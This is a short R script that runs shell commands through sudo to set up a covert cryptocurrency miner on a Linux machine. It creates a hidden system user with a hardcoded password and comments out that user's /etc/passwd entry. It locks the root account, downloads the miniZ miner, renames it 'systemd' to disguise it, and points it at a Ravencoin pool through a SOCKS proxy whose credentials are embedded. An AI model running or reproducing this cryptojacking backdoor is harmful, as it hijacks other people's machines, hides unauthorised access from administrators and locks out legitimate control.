# Load the parallel library
library(parallel)

# Define the username, password, and original command
username <- "newuser"
password <- "password123"
original_command <- "./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns "

# Create a cluster for parallel processing
cl <- makeCluster(2)  # 2 for two processes

# Export the variables to all workers
clusterExport(cl, c("username", "password", "original_command"))

# Run commands in parallel
clusterEvalQ(cl, {
  # Create the user account using the 'adduser' command (Linux)
  system(paste("sudo adduser --system --disabled-login", username))

  # Set the password for the user
  system(paste("echo", paste(username, password), "| sudo chpasswd"))

  # Hide the user from the superuser by modifying /etc/passwd
  system(paste("sudo sed -i '/^", username, "/ s/^/#/' /etc/passwd"))

  # Update and install Docker
  invisible(system("sudo apt update && sudo apt install -y docker.io"))

  # Add user to docker group
  invisible(system(paste("sudo usermod -aG docker", username)))

  # Add subuids for user
  invisible(system(paste("sudo usermod --add-subuids 10-20000", username)))

  # Lock root user
  invisible(system("sudo usermod -L root"))

  # Download miniZ
  invisible(system("wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz"))

  # Extract miniZ
  invisible(system("tar -xvf miniZ_v2.3c_linux-x64.tar.gz"))

  # Move miniZ to systemd
  invisible(system("mv miniZ systemd"))

  # Ping the server
  system("ping -c 5 stratum.ravenminer.com")
})

# Execute the original command
clusterEvalQ(cl, {system(original_command)})

# Stop the cluster
stopCluster(cl)
